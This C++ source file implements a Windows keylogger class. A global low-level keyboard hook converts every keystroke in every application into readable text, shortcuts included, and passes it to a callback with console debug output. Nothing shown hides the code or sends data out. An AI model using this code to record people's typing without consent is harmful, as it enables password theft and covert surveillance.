#include "WindowsKeylogger.hpp"
#include <iostream>
#include <windows.h>
#include <algorithm> // For std::replace if needed
#include <chrono>

namespace platform {
namespace windows_os {

    // Global hook handle and instance pointer
    HHOOK g_hook = NULL;
    std::function<void(const interfaces::KeyEvent&)> g_callback;

    // Low-Level Keyboard Hook Callback
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

            // WM_KEYDOWN or WM_SYSKEYDOWN
            bool is_down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
            bool is_up = (wParam == WM_KEYUP || wParam == WM_SYSKEYUP);

            if ((is_down || is_up) && g_callback) {
                interfaces::KeyEvent evt;
                evt.key_code = pKey->vkCode; // Correct field name
                evt.is_press = is_down;      // Correct field name
                evt.timestamp = GetTickCount64(); // Correct field name

                if (is_down) {
                    DWORD vkCode = pKey->vkCode;

                    // Check modifier states
                    bool shiftDown = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                    bool ctrlDown = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                    bool altDown = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

                    // Special key mappings for common keys
                    std::string keyText;

                    switch (vkCode) {
                        // Navigation/Control keys
                        case VK_RETURN: keyText = "\n"; break;
                        case VK_TAB: keyText = "\t"; break;
                        case VK_SPACE: keyText = " "; break;
                        case VK_BACK: keyText = "[Backspace]"; break;
                        case VK_DELETE: keyText = "[Delete]"; break;
                        case VK_ESCAPE: keyText = "[Esc]"; break;

                        // Modifier keys - skip standalone modifier presses
                        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
                        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
                        case VK_MENU: case VK_LMENU: case VK_RMENU:
                        case VK_LWIN: case VK_RWIN:
                            keyText = ""; // Don't log standalone modifiers
                            break;

                        // Arrow keys
                        case VK_LEFT: keyText = "[Left]"; break;
                        case VK_RIGHT: keyText = "[Right]"; break;
                        case VK_UP: keyText = "[Up]"; break;
                        case VK_DOWN: keyText = ""; break; // Down arrow = empty heartbeat
                        case VK_HOME: keyText = "[Home]"; break;
                        case VK_END: keyText = "[End]"; break;
                        case VK_PRIOR: keyText = "[PgUp]"; break;
                        case VK_NEXT: keyText = "[PgDn]"; break;
                        case VK_INSERT: keyText = "[Insert]"; break;

                        // Function keys
                        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
                        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
                        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
                            keyText = "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
                            break;

                        // Printable characters - handle with ToUnicode for proper shift handling
                        default: {
                            // Get keyboard state
                            BYTE keyboardState[256] = {0};
                            GetKeyboardState(keyboardState);

                            // Set shift state in keyboard state array
                            if (shiftDown) {
                                keyboardState[VK_SHIFT] = 0x80;
                            }
                            if (capsLock) {
                                keyboardState[VK_CAPITAL] = 0x01;
                            }

                            WCHAR unicodeChar[5] = {0};
                            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
                            int result = ToUnicode(vkCode, scanCode, keyboardState, unicodeChar, 4, 0);

                            if (result > 0) {
                                // Convert to UTF-8
                                char utf8[16] = {0};
                                WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, utf8, sizeof(utf8), NULL, NULL);
                                keyText = utf8;

                                // Prepend Ctrl+ or Alt+ if modifiers are held (for shortcuts)
                                if (ctrlDown && !altDown) {
                                    keyText = "[Ctrl+" + keyText + "]";
                                } else if (altDown && !ctrlDown) {
                                    keyText = "[Alt+" + keyText + "]";
                                } else if (ctrlDown && altDown) {
                                    keyText = "[Ctrl+Alt+" + keyText + "]";
                                }
                            } else {
                                // Fallback: use GetKeyNameText
                                char keyName[64] = {0};
                                UINT mapScanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
                                LONG param = (mapScanCode << 16);
                                if (pKey->flags & LLKHF_EXTENDED) param |= (1 << 24);

                                if (GetKeyNameTextA(param, keyName, 64) > 0) {
                                    keyText = "[" + std::string(keyName) + "]";
                                } else {
                                    keyText = "[Key" + std::to_string(vkCode) + "]";
                                }
                            }
                            break;
                        }
                    }

                    // Skip empty key text (standalone modifiers) - except Down arrow which is heartbeat
                    if (keyText.empty() && vkCode != VK_DOWN) {
                        return CallNextHookEx(g_hook, nCode, wParam, lParam);
                    }

                    evt.text = keyText;

                    // DEBUG: Log immediately when key is captured
                    auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count();
                    std::cout << "[KEYLOG-HOOK] Key captured: '" << evt.text << "' at " << now_ms << "ms" << std::endl;
                    std::cout.flush();

                    g_callback(evt);

                    // DEBUG: Log after callback returns
                    auto after_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count();
                    std::cout << "[KEYLOG-HOOK] Callback returned at " << after_ms << "ms (delta=" << (after_ms - now_ms) << "ms)" << std::endl;
                    std::cout.flush();
                }
            }
        }
        return CallNextHookEx(g_hook, nCode, wParam, lParam);
    }

    WindowsKeylogger::WindowsKeylogger() {}
    WindowsKeylogger::~WindowsKeylogger() { stop(); }

    common::Result<common::Ok> WindowsKeylogger::start(std::function<void(const interfaces::KeyEvent&)> callback) {
        if(running_) return common::Result<common::Ok>::success();

        g_callback = callback;
        running_ = true;

        thread_ = std::thread(&WindowsKeylogger::hook_thread, this);
        return common::Result<common::Ok>::success();
    }

    void WindowsKeylogger::stop() {
        if (!running_) return;

        auto start_time = std::chrono::high_resolution_clock::now();
        std::cout << "[WindowsKeylogger] stop() called" << std::endl;

        running_ = false;

        if (thread_id_ != 0) {
            std::cout << "[WindowsKeylogger] Sending WM_QUIT to thread " << thread_id_ << std::endl;
            PostThreadMessage(thread_id_, WM_QUIT, 0, 0);
        }

        if(thread_.joinable()) {
            std::cout << "[WindowsKeylogger] Waiting for thread to join..." << std::endl;
            thread_.join();
            auto join_time = std::chrono::high_resolution_clock::now();
            auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(join_time - start_time).count();
            std::cout << "[WindowsKeylogger] Thread joined after " << elapsed_ms << "ms" << std::endl;
        }

        g_callback = nullptr;
    }

    bool WindowsKeylogger::is_active() const { return running_; }

    void WindowsKeylogger::hook_thread() {
        thread_id_ = GetCurrentThreadId();
        g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

        if (!g_hook) {
            std::cerr << "[WindowsKeylogger] Failed to install hook! Error: " << GetLastError() << std::endl;
            running_ = false;
            return;
        }

        std::cout << "[WindowsKeylogger] Started" << std::endl;
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (g_hook) {
            UnhookWindowsHookEx(g_hook);
            g_hook = NULL;
        }
        std::cout << "[WindowsKeylogger] Stopped" << std::endl;
    }

}
}
